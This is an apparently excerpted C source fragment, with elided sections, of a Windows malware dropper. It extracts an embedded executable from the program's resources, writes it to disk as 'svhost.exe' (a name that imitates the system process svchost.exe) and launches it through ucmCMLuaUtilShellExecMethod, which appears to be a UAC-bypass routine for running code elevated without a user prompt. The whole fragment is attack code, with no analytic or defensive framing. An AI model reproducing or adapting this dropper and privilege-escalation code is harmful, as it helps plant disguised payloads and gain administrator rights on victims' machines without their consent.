...
VOID main()
{
	HRSRC hRsrc = FindResource(0, (LPCWSTR)101, L"MYEXE");
	DWORD dwSize = SizeofResource(NULL, hRsrc);
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	LPVOID lpVoid = LockResource(hGlobal);

	FILE* fp = NULL;
	fopen_s(&fp, "svhost.exe", "wb+");
	...
	strcat(chpath, "\\svhost.exe");
	//printf("%s\n",chpath);
	long lLen = MultiByteToWideChar(CP_ACP, 0, chpath, strlen(chpath), szDest, sizeof(szDest));
	szDest[lLen] = L'\0';
	//wprintf(L"%ls", szDest);
	...
	ucmCMLuaUtilShellExecMethod((LPWSTR)szDest);
}